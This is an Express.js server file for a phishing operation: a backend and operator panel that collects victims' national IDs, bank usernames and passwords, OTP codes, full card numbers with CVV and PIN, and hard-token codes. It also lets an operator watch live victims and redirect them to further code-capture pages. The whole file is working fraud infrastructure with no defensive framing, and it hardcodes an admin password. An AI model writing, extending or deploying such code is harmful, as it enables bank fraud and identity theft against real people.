const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '10mb' }));
app.use(cookieParser());

const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const DATA_FILE = path.join(DATA_DIR, 'visitors.json');
const ADMIN_FILE = path.join(DATA_DIR, 'admin.json');
const SESSIONS_FILE = path.join(DATA_DIR, 'sessions.json');

const ADMIN_USERNAME = 'Admin';
const ADMIN_PASSWORD = 'JAFAR';

let applications = [];
let liveVisitors = [];
let totalVisitors = 0;
let adminConfig = { whatsAppLink: '', customMessage: '' };

try {
  if (fs.existsSync(DATA_FILE)) {
    const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    applications = data.applications || [];
    liveVisitors = data.liveVisitors || [];
    totalVisitors = data.totalVisitors || 0;
  }
} catch (e) { }

try {
  if (fs.existsSync(ADMIN_FILE)) adminConfig = JSON.parse(fs.readFileSync(ADMIN_FILE, 'utf8'));
} catch (e) { }

let saveTimer = null;
function saveData() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => {
    saveTimer = null;
    try {
      fs.writeFileSync(DATA_FILE, JSON.stringify({
        applications, liveVisitors, totalVisitors
      }, null, 2), 'utf8');
    } catch (e) { console.error('Save failed:', e.message); }
  }, 500);
}

function saveAdmin() {
  try { fs.writeFileSync(ADMIN_FILE, JSON.stringify(adminConfig, null, 2), 'utf8'); }
  catch (e) { }
}

const adminSessions = {};
const SESSION_COOKIE = 'manus-session';

function genId() { return crypto.randomBytes(32).toString('hex'); }

function getAdminToken(req) {
  const auth = req.headers.authorization;
  if (auth && auth.startsWith('Bearer ')) return auth.slice(7);
  return req.cookies && req.cookies[SESSION_COOKIE];
}

function isAdmin(req) {
  const token = getAdminToken(req);
  return token && adminSessions[token] === true;
}

function getActiveIds() {
  const cutoff = Date.now() - 120000;
  return applications.filter(a => a.lastActiveAt && a.lastActiveAt > cutoff).map(a => a.nationalId);
}

function findApp(nationalId) {
  return applications.find(a => a.nationalId === nationalId);
}

function findAppById(id) {
  return applications.find(a => a.id === id);
}

function unwrapInput(raw) {
  if (!raw) return {};
  if (raw.json !== undefined) return raw.json;
  return raw;
}

// tRPC handler - supports both admin.X and X formats
function handleProcedure(fullPath, rawInput, req, res) {
  const procedure = fullPath.replace(/^(admin|applications)\./, '');
  const input = unwrapInput(rawInput);

  switch (procedure) {
    case 'login': {
      const { username, password } = input;
      if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        const token = genId();
        adminSessions[token] = true;
        if (res) {
          res.cookie(SESSION_COOKIE, token, { httpOnly: true, sameSite: 'lax', path: '/', maxAge: 86400000 });
        }
        return { isAdmin: true, token };
      }
      throw { message: 'بيانات الدخول غير صحيحة', code: 'UNAUTHORIZED', httpStatus: 401 };
    }

    case 'logout': {
      const token = getAdminToken(req);
      if (token) delete adminSessions[token];
      if (res) res.clearCookie(SESSION_COOKIE);
      return { success: true };
    }

    case 'checkSession': {
      return { isAdmin: isAdmin(req) };
    }

    case 'getApplications': {
      const activeIds = getActiveIds();
      return {
        apps: applications,
        activeIds,
        totalVisitors
      };
    }

    case 'getLiveVisitors': {
      const cutoff = Date.now() - 15000;
      const live = liveVisitors.filter(v => v.lastActiveAt && v.lastActiveAt > cutoff);
      return { visitors: live };
    }

    case 'getAllVisitors': {
      return {
        visitors: liveVisitors,
        totalCount: totalVisitors
      };
    }

    case 'savePersonalInfo': {
      const { nationalId, phoneNumber, fullName, governorate, address } = input;
      if (!nationalId) return { success: false };
      let app = findApp(nationalId);
      if (!app) {
        app = { id: genId().slice(0, 16), nationalId, createdAt: Date.now() };
        applications.push(app);
      }
      Object.assign(app, { phoneNumber, fullName, governorate, address, currentPage: 'personal', lastActiveAt: Date.now() });
      saveData();
      return { success: true };
    }

    case 'saveLoginData': {
      const { nationalId, username, password } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { username, password, currentPage: 'login', lastActiveAt: Date.now() });
        saveData();
      }
      return { success: true };
    }

    case 'saveOtpData': {
      const { nationalId, otpCode } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { otpCode, currentPage: 'otp', lastActiveAt: Date.now() });
        saveData();
      }
      return { success: true };
    }

    case 'saveCardData': {
      const { nationalId, cardNumber, cardExpiry, cardCvv, cardPin } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { cardNumber, cardExpiry, cardCvv, cardPin, currentPage: 'card', lastActiveAt: Date.now() });
        saveData();
      }
      return { success: true };
    }

    case 'saveWatchLink': {
      const { nationalId, watchLinkOtp } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { watchLinkOtp, currentPage: 'watchlink', lastActiveAt: Date.now() });
        saveData();
      }
      return { success: true };
    }

    case 'saveHardToken': {
      const { nationalId, hardTokenCode } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { hardTokenCode, currentPage: 'hard-token', lastActiveAt: Date.now() });
        saveData();
      }
      return { success: true };
    }

    case 'updatePage': {
      const { nationalId, page } = input;
      const app = findApp(nationalId);
      if (app) {
        app.currentPage = page;
        app.lastActiveAt = Date.now();
        saveData();
      }
      return { success: true };
    }

    case 'redirectUser':
    case 'redirectVisitor': {
      const { nationalId, sessionId, page, showError } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app) { app.redirectTo = page; app.redirectError = showError || false; saveData(); }
      }
      if (sessionId) {
        const v = liveVisitors.find(x => x.sessionId === sessionId);
        if (v) { v.redirectTo = page; saveData(); }
      }
      return { success: true };
    }

    case 'clearVisitorRedirect': {
      const { nationalId, sessionId } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app) { delete app.redirectTo; delete app.redirectError; saveData(); }
      }
      if (sessionId) {
        const v = liveVisitors.find(x => x.sessionId === sessionId);
        if (v) { delete v.redirectTo; saveData(); }
      }
      return { success: true };
    }

    case 'clearRedirectByUser': {
      const { nationalId } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app) { delete app.redirectTo; delete app.redirectError; saveData(); }
      }
      return { success: true };
    }

    case 'getRedirectStatus': {
      const { nationalId } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app && app.redirectTo) return { redirectTo: app.redirectTo, redirectError: app.redirectError || false };
      }
      return { redirectTo: null };
    }

    case 'getVisitorRedirect': {
      const { sessionId } = input;
      if (sessionId) {
        const v = liveVisitors.find(x => x.sessionId === sessionId);
        if (v && v.redirectTo) return { redirectTo: v.redirectTo };
      }
      return { redirectTo: null };
    }

    case 'redirectAllToToken': {
      applications.forEach(a => { a.redirectTo = 'token'; });
      saveData();
      return { success: true };
    }

    case 'redirectWhatsApp': {
      const { nationalId } = input;
      const app = findApp(nationalId);
      if (app) { app.redirectTo = 'whatsapp'; saveData(); }
      return { success: true };
    }

    case 'approveLogin': {
      const { nationalId } = input;
      const app = findApp(nationalId);
      if (app) { app.loginStatus = 'approved'; saveData(); }
      return { success: true };
    }

    case 'rejectLogin': {
      const { nationalId } = input;
      const app = findApp(nationalId);
      if (app) { app.loginStatus = 'rejected'; saveData(); }
      return { success: true };
    }

    case 'deleteApplication': {
      const { nationalId } = input;
      applications = applications.filter(a => a.nationalId !== nationalId);
      saveData();
      return { success: true };
    }

    case 'deleteInactiveClients': {
      const activeIds = getActiveIds();
      const before = applications.length;
      applications = applications.filter(a => activeIds.includes(a.nationalId));
      saveData();
      return { success: true, deletedCount: before - applications.length };
    }

    case 'resetTotalVisitors': {
      totalVisitors = 0;
      liveVisitors = [];
      saveData();
      return { success: true };
    }

    case 'getWhatsAppLink': {
      return { link: adminConfig.whatsAppLink || '' };
    }

    case 'updateWhatsAppLink': {
      adminConfig.whatsAppLink = input.link || '';
      saveAdmin();
      return { success: true };
    }

    case 'getCustomMessage': {
      return { message: adminConfig.customMessage || '' };
    }

    case 'setCustomMessage': {
      const { nationalId, message } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app) { app.customMessage = message; saveData(); }
      } else {
        adminConfig.customMessage = message || '';
        saveAdmin();
      }
      return { success: true };
    }

    case 'clearCustomMessage': {
      adminConfig.customMessage = '';
      saveAdmin();
      return { success: true };
    }

    case 'updateVisitor': {
      const { nationalId, ...data } = input;
      const app = findApp(nationalId);
      if (app) { Object.assign(app, data); saveData(); }
      return { success: true };
    }

    default:
      throw { message: `No procedure found on path "${fullPath}"`, code: 'NOT_FOUND', httpStatus: 404 };
  }
}

// All tRPC requests go through batch handler (httpBatchLink always batches)
app.all('/api/trpc/*', (req, res) => {
  const fullPath = req.params[0] || '';
  const procedures = fullPath.split(',').filter(Boolean);
  const results = [];

  for (let i = 0; i < procedures.length; i++) {
    const proc = procedures[i];
    let rawInput = {};

    if (req.method === 'GET') {
      try {
        if (req.query.input) {
          const parsed = JSON.parse(req.query.input);
          rawInput = parsed[String(i)] || parsed[i] || {};
        }
      } catch (e) { }
    } else {
      const body = req.body || {};
      rawInput = body[String(i)] || body[i] || body;
    }

    try {
      const result = handleProcedure(proc, rawInput, req, res);
      results.push({ result: { data: { json: result } } });
    } catch (err) {
      const httpStatus = err.httpStatus || 500;
      results.push({
        error: { json: { message: err.message, code: -32603, data: { code: err.code || 'INTERNAL_SERVER_ERROR', httpStatus, path: proc } } }
      });
    }
  }

  res.json(results);
});

// Visitor presence tracking
app.post('/api/presence', (req, res) => {
  const { sessionId, currentPage } = req.body || {};
  if (!sessionId) return res.json({ ok: false });

  let visitor = liveVisitors.find(v => v.sessionId === sessionId);
  if (!visitor) {
    visitor = { sessionId, createdAt: Date.now(), id: genId().slice(0, 16) };
    liveVisitors.push(visitor);
    totalVisitors++;
  }
  visitor.lastActiveAt = Date.now();
  if (currentPage) visitor.currentPage = currentPage;
  saveData();

  const redirectTo = visitor.redirectTo;
  if (redirectTo) {
    delete visitor.redirectTo;
    saveData();
    return res.json({ ok: true, redirectTo });
  }
  res.json({ ok: true });
});

app.post('/api/heartbeat', (req, res) => {
  const { sessionId, visitorId } = req.body || {};
  const id = sessionId || visitorId;
  if (id) {
    const visitor = liveVisitors.find(v => v.sessionId === id);
    if (visitor) {
      visitor.lastActiveAt = Date.now();
      saveData();
    }
  }
  res.json({ ok: true });
});

// OAuth callback stub
app.get('/api/oauth/callback', (req, res) => {
  res.redirect('/admin/dashboard');
});

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// SPA fallback
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
